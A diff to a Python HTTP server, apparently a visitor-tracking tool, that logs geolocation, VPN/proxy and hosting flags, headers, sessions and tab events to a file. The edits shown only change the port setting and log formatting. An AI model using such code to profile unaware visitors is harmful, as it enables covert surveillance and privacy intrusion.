@@ -7,7 +7,7 @@ device motion, network info, headers, session tracking, persistent logging.
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import json, datetime, os, uuid
 
-PORT     = 5000
+PORT     = int(os.environ.get('PORT', 5000))
 LOG_FILE = "tracker_log.txt"
 SESSIONS = {}  # session_id -> visit count
 
@@ -506,9 +506,9 @@ class Handler(BaseHTTPRequestHandler):
                     log(f"    REGION     : {db.get('regionName')}, {db.get('country')}")
                     log(f"    ZIP        : {db.get('zip')}")
                     log(f"    TIMEZONE   : {db.get('timezone')}")
-                    log(f"    MOBILE     : {flag(db.get('mobile',False), True, Y, DIM+'No'+RST)}")
-                    log(f"    VPN/PROXY  : {flag(db.get('proxy',False),  True, R, G+'No'+RST)}")
-                    log(f"    HOSTING    : {flag(db.get('hosting',False), True, Y, DIM+'No'+RST)}")
+                    log(f"    MOBILE     : {flag(db.get('mobile', False))}")
+                    log(f"    VPN/PROXY  : {flag(db.get('proxy',  False), True, R)}")
+                    log(f"    HOSTING    : {flag(db.get('hosting',False), True, Y)}")
 
             # ── SERVER HEADERS ────────────────────────────────────────────────
             log(f"\n  {BOLD}{C}[ HTTP HEADERS ]{RST}")
@@ -572,7 +572,7 @@ class Handler(BaseHTTPRequestHandler):
             if tab_events: log(f"    TAB EVENTS : {len(tab_events)} event(s) — {[e.get('state') for e in tab_events]}")
 
             log(f"\n  {DIM}Saved to {LOG_FILE}{RST}")
-            log(f"{DIM}{'─'*60}{RST}")
+            log(f"{BOLD}{W}{'═'*60}{RST}\n")
 
         except Exception as e:
             print(f"{R}[ERROR] {e}{RST}")
